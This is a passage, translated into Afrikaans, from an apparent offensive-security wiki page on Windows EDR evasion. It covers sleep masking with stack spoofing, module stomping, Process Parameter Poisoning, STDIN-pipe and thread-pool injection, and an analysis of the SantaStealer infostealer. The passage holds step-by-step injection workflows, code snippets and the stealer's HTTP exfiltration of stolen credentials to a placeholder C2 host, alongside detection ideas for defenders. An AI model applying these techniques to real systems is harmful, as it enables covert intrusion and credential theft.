- Kies ’n ander thread in dieselfde proses en lees sy `NT_TIB` / TEB-stackgrense (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Rugsteun die huidige thread se werklike TEB/TIB.
- Vang die werklike slaapkonteks vas met `GetThreadContext`.
- Kopieer **slegs** die werklike `Rip` na die spoof-konteks en laat die gespoofte `Rsp`/stack-toestand onveranderd.
- Kopieer tydens die slaapvenster die spoof-thread se `NT_TIB` na die huidige TEB sodat stack walkers binne ’n wettige stack-reeks unwind.
- Herstel die oorspronklike TIB en thread-konteks nadat die wait voltooi is.

Dit behou ’n CET-konsekwente instruction pointer terwyl dit EDR-stack walkers mislei wat TEB-stackmetadata vertrou om unwinds te valideer.

### APC-gebaseerde alternatief: Kraken Mask

As timer-queue-dispatch te herkenbaar is, kan dieselfde sleep-encrypt-spoof-restore-volgorde vanaf ’n opgeskorte helper-thread met queued APCs uitgevoer word:<sup>[[27]](#references)</sup>

- Skep ’n helper-thread met `NtTestAlert` as entrypoint.
- Queue voorbereide `CONTEXT`-frames/APCs met `NtQueueApcThread` en verwerk hulle met `NtAlertResumeThread`.
- Stoor die kettingtoestand op die heap in plaas van die helper-stack om te verhoed dat die verstek-thread-stack van 64 KB uitgeput word.
- Gebruik `NtSignalAndWaitForSingleObject` om die begingebeurtenis atomies te sein en te blokkeer.
- Skort die hoofthread op voordat die TIB/konteks herstel word (`NtSuspendThread` → herstel → `NtResumeThread`) om die resiesvenster te verklein waarin ’n scanner ’n halfherstelde stack kan opspoor.

Dit vervang die `CreateTimerQueueTimer` + `NtContinue`-signatuur met ’n helper-thread/APC-signatuur, terwyl dieselfde RC4-masking- en stack-spoofing-doelwitte behou word.

Bykomende opsporingsidees
- `NtSetInformationVirtualMemory` met `VmCfgCallTargetInformation` kort voor sleeps, waits of APC-dispatch.
- `GetThreadContext`/`SetThreadContext` omring deur `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` of `ConnectNamedPipe`.
- `NtQueryInformationThread` gevolg deur direkte skrywes na die huidige thread se TEB/TIB-stackgrense.
- `NtQueueApcThread`/`NtAlertResumeThread`-kettings wat indirek `SystemFunction032`, `VirtualProtect` of helpers vir die herstel van afdelings-toestemmings bereik.
- Herhaalde gebruik van kort gadget-signatures soos `FF 23` (`jmp [rbx]`) of `FF E7` (`jmp rdi`) as dispatch-pivots binne getekende modules.


## Presisie-module-stomping

Module-stomping voer payloads uit die **`.text`-afdeling van ’n DLL wat reeds binne die teikenproses gemap is** uit, eerder as om ooglopende private uitvoerbare geheue te allokeer of ’n nuwe offer-DLL te laai. Die oorskryf-teiken behoort ’n **gelaaide, skyf-gesteunde image** te wees waarvan die koderuimte die payload kan akkommodeer sonder om kodepaaie wat die proses steeds nodig het, te beskadig.<sup>[[1]](#references)[[2]](#references)</sup>

### Betroubare teikenkeuse

Naïewe stomping teen algemene modules soos `uxtheme.dll` of `comctl32.dll` is broos: die DLL is dalk nie in die afgeleë proses gelaai nie, en ’n te klein kode-area sal die proses laat crash. ’n Betroubaarder werkvloei is:

1. Lys die teikenproses se modules en behou ’n **name-only-include-lys** van DLLs wat reeds gelaai is.
2. Bou eers die payload en teken die **presiese grepegrootte** aan.
3. Skandeer kandidaat-DLLs op skyf en vergelyk die PE-afdeling se **`.text` `Misc_VirtualSize`** met die payload-grootte. Dit is belangriker as die lêergrootte, omdat dit die grootte van die uitvoerbare afdeling **wanneer dit in geheue gemap is** weerspieël.
4. Ontleed die **Export Address Table (EAT)** en kies ’n uitgevoerde funksie-RVA as die stomp-begin-offset.
5. Bereken die **ontploffingsradius**: as die payload die gekose funksiegrens oorskry, sal dit aangrensende exports wat daarna in geheue gerangskik is, oorskryf.

Tipiese recon-/keusehulpmiddels wat in die praktyk gesien word:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operasionele notas
- Verkies DLLs wat **reeds gelaai** is in die afgeleë proses om die telemetrie van `LoadLibrary`/onverwagte image loads te vermy.
- Verkies exports wat die teikentoepassing selde uitvoer; anders kan normale kodepaaie die stomped bytes raak voordat of nadat die thread geskep is.
- Groot implants vereis dikwels dat shellcode-inbedding van ’n string literal na ’n **byte-array/braced initializer** verander word sodat die volledige buffer korrek in die injector-bronkode voorgestel word.

Idees vir opsporing
- Afgeleë skryfbewerkings na image-backed uitvoerbare bladsye (`MEM_IMAGE`, `PAGE_EXECUTE*`) in plaas van die meer algemene private RWX/RX-allocations.
- Export entry points waarvan die in-geheue-bytes nie meer ooreenstem met die backing file op skyf nie.
- Remote threads of context pivots wat begin uitvoer binne ’n legitieme DLL-export waarvan die eerste bytes onlangs gewysig is.
- Verdagte `VirtualProtect(Ex)` / `WriteProcessMemory`-reekse teen DLL `.text`-bladsye, gevolg deur thread creation.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) is ’n **process-injection / EDR-evasion**-tegniek wat die klassieke remote write-pad (`VirtualAllocEx` + `WriteProcessMemory`) vermy. In plaas daarvan om bytes na ’n reeds lopende teiken te kopieer, misbruik dit die feit dat Windows **geselekteerde `CreateProcessW`-opstartparameters na die child process kopieer** en dit binne `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) stoor.<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers wat deur `CreateProcessW` gekopieer word

Nuttige carriers is:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (met `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktiese beperkings op carriers:

- `lpCommandLine` moet na **skryfbare geheue** vir `CreateProcessW` wys, en is beperk tot **32,767 Unicode-karakters**, insluitend die null terminator.
- `lpEnvironment` moet ’n Unicode environment block wees met opeenvolgende `NAME=VALUE\0`-strings wat deur ’n ekstra `\0` beëindig word.
- `lpReserved` is amptelik gereserveer, dus moet die `ShellInfo`-kartering as ’n implementeringsdetail eerder as ’n stabiele, gedokumenteerde kontrak beskou word.

Dit verander normale process creation in die **payload-transfer-primitive**. Die operator skep die child process met aanvallerbeheerde opstartdata en laat Windows die copy tussen prosesse uitvoer.

### Remote lookup-vloei sonder remote write-API’s

Nadat die child geskep is, los die gekopieerde buffer op met **leesalleen**-primitiewe:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → kry `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Lees die remote `PEB`
3. Volg `PEB.ProcessParameters`
4. Lees `RTL_USER_PROCESS_PARAMETERS`
5. Gebruik die geselekteerde pointer:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimale vloei:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Uitvoer van die gekopieerde parameterbuffer

Die gekopieerde parameterstreek is gewoonlik `RW`, nie uitvoerbaar nie. ’n Algemene P3-ketting is:

1. Skep die proses normaalweg (nie opgeskort nie)
2. Maak die gekose parameterbladsy uitvoerbaar met `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Hergebruik die hoofthread-hanteerder wat reeds in `PROCESS_INFORMATION` teruggegee is
4. Herlei uitvoering met `NtSetContextThread` (`CONTEXT_CONTROL`, oorskryf `RIP`)

Anders as klassieke thread-hijacking-werkvloeie, vereis dit **nie** `SuspendThread` / `ResumeThread` nie; die konteks kan direk op die teruggegewe hoofthread-hanteerder verander word.

Dit vermy verskeie API’s wat algemeen vir injection gemonitor word:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- dikwels ook `SuspendThread` / `ResumeThread`

### Nulgreepbeperking en gefaseerde shellcode

Al drie draers is **string- of stringagtige data**, dus word ’n rou payload wat `0x00` bevat tydens oordrag afgekap. ’n Praktiese oplossing is ’n **nulgreepvrye eerste fase** wat konstantes tydens looptyd rekonstrueer en dan ’n arbitrêre tweede fase laai.

’n Eenvoudige patroon is XOR-gebaseerde konstantsintese:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Dit laat die eerste stadium toe om stack-strings, API-argumente, DLL-paaie of ’n tweede-stadium shellcode-loader te bou sonder om nulgrepe in die oorgedraagde parameter in te sluit.

### Stack-gebaseerde API-oproepe vanaf die eerste stadium

Wanneer die eerste stadium API’s soos `LoadLibraryA` moet aanroep, kan dit:

- die string/buffer op die teiken se stack plaas
- die **32-byte x64 shadow space** reserveer
- `RCX`, `RDX`, `R8`, `R9` op konstantes of `RSP`-relatiewe wysers stel
- `RSP` **16-byte-belyn** hou voor die oproep

’n Tweede stadium kan dan vanaf die stack na ’n `PAGE_READWRITE`-toekenning gekopieer word, met `VirtualProtect` na `PAGE_EXECUTE_READ` verander word en uitgevoer word, wat ’n direkte RWX-toekenning vermy.

### Opsporingsidees

Goeie geleenthede vir ondersoek wat deur die outeurs genoem word:

- `VirtualProtectEx` / `NtProtectVirtualMemory` wat **prosesparameterbladsye uitvoerbaar maak**
- daardie beskermingsverandering gevolg deur `SetThreadContext` / `NtSetContextThread`
- afgeleë lesings van `PEB` en daarna `RTL_USER_PROCESS_PARAMETERS`
- buitengewoon lang of hoë-entropie `lpCommandLine`-, `lpEnvironment`- of `STARTUPINFO.lpReserved`-waardes tydens prosesskepping

### Aantekeninge

- P3 is ’n **oordragtegniek tussen prosesse**, nie op sigself ’n volledige uitvoeringsprimitief nie: die gekopieerde parameter benodig steeds ’n verandering na uitvoertoestemming en ’n metode om uitvoering te herlei.
- `RtlCreateProcessReflection` / Dirty Vanity is deur die outeurs oorweeg, maar verwerp omdat dit intern verdagte primitiewe soos `NtWriteVirtualMemory` en `NtCreateThreadEx` aanroep.

## Console STDIN pipe injection

’n Interaktiewe konsolekindproses kan ook as die **payload-oordragprimitief** gebruik word. Die inspuiter herlei die kindproses se standaardinvoer na ’n pipe en stuur ’n merker gevolg deur shellcode. Nadat die konsoleprogram die data in sy eie private geheue gelees het, vind die inspuiter daardie buffer, maak dit uitvoerbaar en herlei ’n kindprosesdraad daarheen. Dit vermy `VirtualAllocEx` en `WriteProcessMemory`, maar dit bly process injection eerder as ’n algemene EDR-bypass.<sup>[[41]](#references)</sup>

Ondanks die "named-pipe"-beskrywing roep die verwysingsimplementering `CreatePipe` aan, wat ’n **anonymous pipe** skep. Windows implementeer anonymous pipes intern met uniek benoemde pipe-objekte, maar die PoC kies nie ’n `\\.\pipe\<name>`-pad nie en roep ook nie `CreateNamedPipe` aan nie. Dit skep handvatsels wat geërf kan word met ’n versteksekuriteitsbeskrywer, plaas die leeshandvatsel in `STARTUPINFO.hStdInput`, stel `STARTF_USESTDHANDLES` en begin ’n nuwe kindproses met handvaterwing geaktiveer. Daarom begin hierdie PoC die verskafde konsole-uitvoerbare lêer; dit koppel nie sy pipe aan ’n bestaande proses nie.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Verwysingswerkvloei

Die implementering gebruik die volgende ketting:<sup>[[41]](#references)</sup>

1. Skep anonymous pipe-pare vir die kindproses se `STDIN` en `STDOUT`. Skakel oorerwing op die twee handvatsels aan die ouerproseskant af en sluit die duplikate aan die kindproseskant in die ouerproses nadat die proses geskep is.
2. Begin ’n interaktiewe uitvoerbare lêer soos `netsh.exe` of `nslookup.exe` met `CREATE_NEW_CONSOLE`. Die kindproses erf die herleide standaardhandvatsels.
3. Stuur die volledige binêre `rawData`-skikking met `WriteFile` deur die `STDIN`-handvatsel aan die ouerproseskant. Die konsoleprogram verwerk die grepe en laat ’n kopie in een van sy private, toegewyde geheuestreke agter.
4. Loop deur die kindproses se adresruimte met `VirtualQueryEx`, lees kandidaat-`MEM_PRIVATE`-streke met `ReadProcessMemory` en soek die merker aan die begin van `rawData`.
5. Verander die ontdekte buffer se beskerming na `PAGE_EXECUTE_READWRITE` met `VirtualProtectEx`.
6. Identifiseer die hoofdraad, skort dit op, stel `RIP` met `NtSetContextThread` op `found_address + 0x19` en hervat dit.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Die verskafde implementering is x64-spesifiek: dit wysig `CONTEXT.Rip`, en die ingebedde payload is x64-shellcode. `rawData` begin met ’n merker van 25 grepe, dus begin uitvoerbare grepe by heksadesimale offset `0x19`. Wanneer jy die payload vervang, behou dié uitleg of werk die merker, soekvektor, skikkinggrootte en uitvoeringsoffset saam by. Die bronkommentaar lys ook `0x0A`, `0x0D` en `0x1A` as slegte karakters. Hierdie werksvloei verander nie die kindproses se token of voorregte nie.<sup>[[41]](#references)</sup>

Vir klein native helpers en payload-kompilasiepatrone, sien [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Thread-pool callback DLL-inspuiting sonder shellcode (DLLParty)

DLLParty pas PoolParty-styl thread-pool-inspuiting aan sodat ’n bestaande teiken-worker `LoadLibraryA` aanroep, eerder as om ’n ingespuite callback-stub uit te voer. Die dispatch-primitief is ’n `TP_DIRECT`-voltooiing wat na die teikenpool se I/O-voltooiingspoort in die tou geplaas word. Dit omseil nie prosesregte nie: die PoC roep `OpenProcess(PROCESS_ALL_ACCESS)` aan en benodig leesbare/skryfbare teikengeheue sowel as dupliseerbare worker-factory- en voltooiingspoorthandvatsels.<sup>[[46]](#references)[[47]](#references)</sup>

Op Windows x64 stuur die worker ’n pointer na sy stapelgebaseerde `TP_CALLBACK_INSTANCE` in `RCX`, die eerste callback-argument. `LoadLibraryA` interpreteer dieselfde pointer as ’n `LPCSTR`. Op die getoetste roete bou `TppWorkerThread` die pointer by `RSP+0x178`, terwyl sy eerste gewone skryfbewerking in daardie objek by `RSP+0x1d0` plaasvind. ’n Nul-getermineerde DLL-pad wat binne hierdie voorvoegsel van 0x58 grepe pas, kan dus aan die begin van die instansie geplaas word sonder om voor dispatch oorskryf te word. Dit is ’n waarneming wat spesifiek vir hierdie build geld, nie ’n gedokumenteerde Windows ABI-waarborg nie.<sup>[[46]](#references)[[47]](#references)</sup>

Die verwysingswerksvloei is:<sup>[[46]](#references)[[47]](#references)</sup>

1. Lys die teiken se handvatsels met `NtQuerySystemInformation(SystemHandleInformation)` en identifiseer `TpWorkerFactory` deur objeksoorte navraag te doen. Dupliseer ’n worker-factory-handvatsel en doen navraag oor `WorkerFactoryBasicInformation`; `StartParameter` gee die afgeleë `TP_POOL`. Slaan factories met `TotalWorkerCount == 0` oor.
2. Lees `TP_POOL.CompletionPort` en loop deur die pool se private worker-lys. Op die getoetste Windows 10 19045 x64-build (`ntdll.dll 10.0.19041.4842`) is die kop by `pool+0x60`; elke skakel is by `worker+0x10`, dus is die callback-instance-gleuf by `worker+0x38` gelyk aan `link+0x28`. Die PoC kontroleer pointer-belyning, skakel-omkeerbaarheid, pooleienaarskap, nie-nul thread-ID’s, herhaalde nodusse en ’n stabiele lyskop.
3. Skryf die DLL-pad na **elke** herwonne worker-gleuf, omdat enige worker die voltooingsboodskap uit die tou kan haal. Plaas ’n `TP_DIRECT` met `Callback = LoadLibraryA` in skryfbare teikengeheue. Die PoC gebruik `last_slot-0x500` op ’n worker-stapel in plaas van `VirtualAllocEx`; dié offset is eksperimenteel en mag nie met aktiewe stapeldata oorvleuel nie.
4. Dupliseer die teiken se voltooiingspoorthandvatsel en roep `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)` aan. Die afgeleë `TP_DIRECT`-adres is die voltooiingsleutel. ’n Bestaande worker roep dan `LoadLibraryA` aan met sy oorskryfde callback-instance-pointer en laai ’n DLL wat reeds vir die teiken toeganklik is.

Die PoC aanvaar ’n teiken-PID (`DLLParty.exe <target_pid>`) en gebruik ’n hardgekodeerde DLL-pad in `DLLParty.cpp`; stel ’n pad in wat vir die teiken toeganklik is voordat jy ’n x64-uitvoerbare lêer bou. Dit gebruik ook sy eie proses se `LoadLibraryA`-adres as die afgeleë callback, dus aanvaar dit dat dié adres geldig is in die teiken. Die kode kontroleer nie of die padlengte binne die voorvoegsel van 0x58 grepe pas, of dat worker-deurloop ’n gleuf gevind het voordat die laaste element geïndekseer word nie. Valideer die private offsets, stapeluitleg en skryfbare ruimte vir die teikenbuild weer. Die weglating van `CreateRemoteThreadEx`, shellcode en `VirtualAllocEx` skakel kruisprosesskryfbewerkings of DLL-laai-telemetrie nie uit nie.<sup>[[46]](#references)[[47]](#references)</sup>

## SantaStealer se tradecraft vir fileless-ontduiking en geloofsdiefstal

SantaStealer (ook bekend as BluelineStealer) wys hoe moderne info-stealers AV-bypass, anti-analise en toegang tot geloofsbriewe in ’n enkele werksvloei kombineer.<sup>[[24]](#references)</sup>

### Sleutelborduitlegfiltering en sandbox-vertraging

- ’n Konfigurasievlag (`anti_cis`) lys geïnstalleerde sleutelborduitlegte met `GetKeyboardLayoutList`. As ’n Cyrilliese uitleg gevind word, skep die sample ’n leë `CIS`-merker en beëindig dit, voordat dit stealers uitvoer. So verseker dit dat dit nooit op uitgeslote streke ontplof nie, terwyl dit ’n artefak vir opsporing agterlaat.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Gelaagde `check_antivm`-logika

- Variant A loop deur die proseslys, hash elke naam met ’n pasgemaakte rollende kontrolesom en vergelyk dit met ingebedde bloklyste vir debuggers/sandboxes; dit herhaal die kontrolesom oor die rekenaarnaam en kontroleer werkgidse soos `C:\analysis`.
- Variant B inspekteer stelseleienskappe (minimum prosesgetal, onlangse looptyd), roep `OpenServiceA("VBoxGuest")` aan om VirtualBox additions op te spoor en doen tydtoetse rondom slaaptye om single-stepping te herken. Enige treffer laat die uitvoering staak voordat modules begin.

### Lêerlose helper + dubbele ChaCha20-reflektiewe laai

- Die primêre DLL/EXE bevat ’n Chromium-aanmeldbesonderhede-helper wat óf na die skyf geskryf óf met die hand in geheue gekarteer word; in lêerlose modus los dit invoere/relokasies self op sodat geen helper-artefakte geskryf word nie.
- Dié helper stoor ’n tweede-stadium-DLL wat twee keer met ChaCha20 geënkripteer is (twee 32-greep-sleutels + 12-greep-nonce). Ná albei dekripsiestappe laai dit die blob reflektief (geen `LoadLibrary` nie) en roep die uitvoere `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` aan, afgelei van [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Die ChromElevator-roetines gebruik reflektiewe proses-hollowing met direkte syscalls om in ’n aktiewe Chromium-blaaier in te spuit, AppBound Encryption-sleutels te erf en wagwoorde/koekies/kredietkaarte direk uit SQLite-databasisse te dekripteer, ondanks ABE-verharding.


### Modulêre geheueversameling en stukgewyse HTTP-exfil

- `create_memory_based_log` loop deur ’n globale `memory_generators`-funksiewysertabel en begin een thread per geaktiveerde module (Telegram, Discord, Steam, skermskote, dokumente, blaaieruitbreidings, ens.). Elke thread skryf resultate na gedeelde buffers en rapporteer sy lêertelling ná ’n aansluitvenster van ongeveer 45 sekondes.
- Wanneer dit klaar is, word alles met die staties gekoppelde `miniz`-biblioteek as `%TEMP%\\Log.zip` saamgepers. `ThreadPayload1` slaap dan 15 sekondes en stroom die argief in stukke van 10 MB via HTTP POST na `http://<C2>:6767/upload`, terwyl dit ’n blaaier-`multipart/form-data`-grens (`----WebKitFormBoundary***`) namaak. Elke stuk voeg `User-Agent: upload`, `auth: <build_id>` en, opsioneel, `w: <campaign_tag>` by; die laaste stuk voeg `complete: true` by sodat die C2 weet dat die herbouing voltooi is.

## References

- [1] [Gevorderde ontduikingstegnieke: presisie-module-stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Oproepstapels: geen gratis passe meer vir malware nie](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokumentasie](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – voorbeeld](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – voorbeeld](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC vir vervalsing van oproepstapels](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nuwe infeksieketting en ConfuserEx-gebaseerde verduistering vir DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Moet jy jou zero trust vertrou? Omseiling van Zscaler-houdingkontroles](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Voor ToolShell: Ondersoek na Storm-2603 se vorige lospryswarebedrywighede](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Misbruik van aangestuurde uitvoere](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11-inventaris van aangestuurde uitvoere (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Soekvolgorde vir dinamieskakelbiblioteke](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Prosessekuriteit en toegangsregte](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU-verwysing (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL-lanseerder](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Bestryding van EDR’s met die ondersteuning van Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Breek die beskermende dop van Windows Defender met die vouerherleidingstegniek](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Verwysing vir die mklink-opdrag](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Onder die Pure-gordyn: Van RAT tot bouer tot kodeerder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer kom stad toe: ’n Nuwe, ambisieuse infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption-dekripsie](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Die verslaan van Node.js-malware met API-nasporing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Slapende Skoonheid: Om Adaptix met Crystal Palace te laat slaap](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Vergiftiging van prosesparameters](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Slapende Skoonheid II: CFG, CET en vervalsing van stapels](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko-slaapverduistering](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Versteek jou Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Misbruik van Chrome Remote Desktop tydens Red Team-bedrywighede: ’n Praktiese gids](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Bewapening van Defender se herstelbestuurder as ’n kernbewerkingsprimitief](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo-metgeselkode](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Skep van selfmaskerende funksies met LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole-bronkode](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe-funksie](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Skep van ’n kinderproses met herlei invoer en uitvoer](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Hersmee van C#-nutsmiddels met WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Samestelling van C# / .NET-projekte](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty-bewys-van-konsep en bronkode](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Misbruik van thread pool-internals vir shellcodeless DLL-inspuiting](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
{{#include ../banners/hacktricks-training.md}}
